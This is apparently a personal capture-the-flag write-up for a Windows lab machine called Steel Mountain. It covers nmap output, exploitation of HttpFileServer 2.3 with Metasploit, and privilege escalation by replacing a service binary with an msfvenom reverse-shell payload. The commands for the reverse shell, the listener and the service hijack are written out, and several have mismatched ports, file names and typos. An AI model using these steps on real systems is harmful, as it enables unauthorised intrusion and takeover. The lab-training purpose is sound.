#CTF 

*In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.*

## Recon 

As always we start with [[Nmap]]: 

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     \xb3
|     steelmountain0
|     230428102825Z
|     231028102825Z0
|     steelmountain0
|     ((d.
|     5MQF
|     !8z#
|     }Z@<b
|     \x0e[y
|     $0"0
|     \xbc"
|     p9N)b
|     509$
|     6M9yZVA+
|     ^<r5
|_    Qg3G
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-04-28T10:28:25
|_Not valid after:  2023-10-28T10:28:25
|_ssl-date: 2023-04-29T10:43:56+00:00; 0s from scanner time.
8080/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=4/29%Time=644CF4AF%P=x86_64-pc-linux-gnu%r(TL
SF:SSessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03dL\xf4\xaa1\xe3\xb8Q
SF:\x18\xfb\x89\x0b\xedU\x05\x7f\xa3I\xca\xb7\+\]\xcb\x93\xbd\x8e\x1c\xdf\
SF:xe0\xc6\x88\x88\x20\xe7\x16\0\0\xb2\x9f\xea\xa3\x07\xdf\x97\xf6\xac\x1a
SF:\x80\\\xb3\x91\xd5\x10H8\xa9s\x1a\xaedz\x0bT\xd2\xad\0/\0\0\x05\xff\x01
SF:\0\x01\0\x0b\0\x02\xe8\0\x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa
SF:0\x03\x02\x01\x02\x02\x10\x20&\xee\x94\x0f\xa3\xac\x86O\x8etRQ\r\x13\x9
SF:b0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U
SF:\x04\x03\x13\rsteelmountain0\x1e\x17\r230428102825Z\x17\r231028102825Z0
SF:\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x82\x01\"0\r\x06\t\
SF:*\x86H\x86\xf7\r\x01\x01\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x
SF:82\x01\x01\0\xbe\xa2\x12\x80\(\(d\.\xeb\xfayxO\xc6L\x12\xf7#\x8c\xcf5MQ
SF:F\xb5\x83\xcf\xf3\xcb\xeb\xa2\x1d\xbay\x90\xdb\xbe\x9a\x8e\x04\^\xbaS\x
SF:81\xcb\xda\x98\xca\x91\x0bG\xb1\xd0\xad\xa4\xd5\x94\xad\x94\xd3\xd0;\xb
SF:c\x8ff\x1d;\x85z\xfe\xcbY\x08C\r\xae!\?\xd9%\xfe\$,\xc0\x19q\x94\x85P3\
SF:xd1\t\x7f\+k\xee!8z#\x01~\0-\xd2}Z@<b\xa5~\x058v\x0cw\xea\x10\+l\x82\x7
SF:f\(\xa7W\xb7\xe5\xdczu\xbe\xf7\x9e\xc3\x17M\x9f\0\xff\x17m\xfd\xfa\x94\
SF:xc0\xbc\xfbe-\xe1\x9e\x85U\x99\xcfJV>\xb9\xe0\xc0\xf3\x19\xcbxc\xf9\xf2
SF:\xe5\xdd\xeaf\xcc>o2\x1c\x80\xe8r\+\xcd\x8e\xc2\x8fV/L\xbf\x7f\x87\x7f\
SF:xf8mG\xeb\x90\x0ce\x93\xe6\xaf\x962\xb4Y\xca\xc0\xb6\|\xd3<\x17\xb7}I\x
SF:b82\x95\xbe=\xf6\0\xc6\\\x0e\[y\xf0\x03uk6\xe4JT\xedc\xafN<\xea\x04\xad
SF:\xeeO\xb7}\xd1\x8e@\x83H\xa5\xe1\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x0
SF:3U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\
SF:x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\
SF:0\x03\x82\x01\x01\0\x8e\xd6\x93\xebl\n\\\xbc\"\xe3\xfd\xed\xf1\)f\xf5\x
SF:ed\x06p;\xe0\xe4\x18\xf4`\xd6p9N\)b\x9e\x7f\xc1\xb6C:>\0\x1b\x7f\xef\xa
SF:5\x90D\x8b\xe1509\$\xa6h\xa3X9\"\x9aA\xef\x1fgc'\xdcw\xcf\xf3\x956M9yZV
SF:A\+\xdf\x18fq\x1fl\x1c\*P\)\x05\xfcD{~\xf4W\x0f\xb2\xf0\xfcB\xf3\xd5\?\
SF:xe3\x83s\[\x93\xa8\xcaZ\xf2`\xfd\x9eg\\P\xa8\x9f\xeb\xcd\xa1\xa6\xe9\x9
SF:7/}\xce\x8bG\xcd\xd6\x8b\xaaM\x9e\xe6\xb7\xba3\xfeHn\xc9\xb6\xcb\x8dbo7
SF:\x1b\xb2B\x0ed\x14\x06\xe4\x04X\x1b\xb1\t\^<r5\x1f\xfe\x16\xe2\xb8t\xe1
SF:\xc7d\xe9s\x98\xa0\x9e\xe8HHC\x0b\x93\xdb0e\xd7;\xc4\x89\xe6\xbe\xde\xc
SF:7,~\xa5FXM\xb9\xa1\xc5\xaf\]\xbd\|:\xf4\xf9\x03\xc9\x9c\xdb\xacQg3G\xad
SF:R\xfeJ\$y\x9a\x90x\xf4X\xd2F\x11\x02\x80\xa7i\|\xd7\xb7Kb\xa2\xb8\xfeY\
SF:xe4\x8f\x8e\xc1\xd6=\x0e\0\0\0");
MAC Address: 02:26:8D:D7:A8:A7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=4/29%OT=80%CT=1%CU=37853%PV=Y%DS=1%DC=D%G=Y%M=02268D%T
OS:M=644CF4F1%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%TS=7
OS:)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=102%GCD=1%ISR=
OS:10A%TI=I%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2
OS:301NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2
OS:000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=
OS:Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%R
OS:D=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:26:8d:d7:a8:a7 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-29 11:43:56
|_  start_date: 2023-04-29 11:28:13
```

Lots and lots of data here. The room doesn't tells us anything , so I see the port 80 and I google the site.
The site has the logo of the company and a photo of the Emplotee of the month.
We also see a 8080 port that runs http file server as well.
We go there and now we need to search online for exploits.
I found https://www.exploit-db.com/exploits/39161

## Access

So we are going to use [[Metasploit]] to gain access to the machine.
We search for httpfile server 2.3 and we get:
`exploit/windows/http/rejetto_hfs_exec`
We set RHOSTS to the target ip and RPORT to 8080 and exploit!
We got access , then we look around and we find our first flag!



## Privilege Escalation

Next we have to gain some privileges. We will use https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

We save it on a file an `upload [file name]` on meterpreter.
After we successfully upload it we type
`load powershell` and
`powershell_shell` and we have power shell!
Next we type
`. .\PowerUp.ps1`
`Invoke-AllChecks`
We take a look and we see that AdvancedSystemCareService9 can be restarted, so we craft a payload with:
`msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
Then on power shell we CTRL+C to exit, `background` meterpreter
`use multi/hanler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST [ip]`
`set LPORT 1234`
`run -j`

Then we go back to meterpreter session and type `shell` to go back to windows machine.
`sc stop AdvancedSystemCareService9` to stop the process.
Exit the shell
`uploadupload ASCService.exe "\Program Files (x86)\IObit\Advanced\SystemCare\ASCService.exe"`
back to shell and
`sc start AdvancedSystemCareService9`
